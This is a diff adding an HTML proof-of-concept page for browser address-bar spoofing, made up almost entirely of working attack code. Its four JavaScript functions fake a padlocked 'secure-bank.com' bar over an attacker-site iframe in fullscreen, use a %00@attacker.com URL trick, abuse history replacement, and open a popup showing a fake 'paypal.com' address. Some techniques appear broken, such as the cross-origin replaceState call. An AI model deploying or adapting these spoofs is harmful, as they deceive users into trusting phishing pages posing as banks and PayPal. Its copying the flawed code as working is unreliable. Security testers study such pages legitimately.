@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Address Bar Spoofing PoC</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; }
+        #fake-ui { position: fixed; top: 0; left: 0; width: 100%; height: 40px; background: white; z-index: 9999; padding: 10px; }
+    </style>
+</head>
+<body>
+    <h1>Address Bar Spoofing PoCs</h1>
+    <p>Test different spoofing techniques below:</p>
+
+    <button onclick="fullscreenSpoof()">Fullscreen Spoof</button>
+    <button onclick="urlEncodingSpoof()">URL Encoding Trick</button>
+    <button onclick="replaceHistory()">History Manipulation</button>
+    <button onclick="popupSpoof()">Pop-up Spoof</button>
+
+    <script>
+        function fullscreenSpoof() {
+            document.documentElement.requestFullscreen();
+            document.body.innerHTML = `
+                <div id='fake-ui'>🔒 https://secure-bank.com</div>
+                <iframe src='https://attacker-site.com' style='width:100%; height:100vh; border:none;'></iframe>
+            `;
+        }
+
+        function urlEncodingSpoof() {
+            window.location.href = "https://www.google.com%00@attacker.com";
+        }
+
+        function replaceHistory() {
+            window.location.replace("https://secure-bank.com");
+            setTimeout(() => {
+                history.replaceState({}, "Fake Title", "https://secure-bank.com");
+            }, 200);
+        }
+
+        function popupSpoof() {
+            let win = window.open("", "", "width=400,height=50");
+            win.document.write("<p>🔒 https://paypal.com</p>");
+        }
+    </script>
+</body>
+</html>
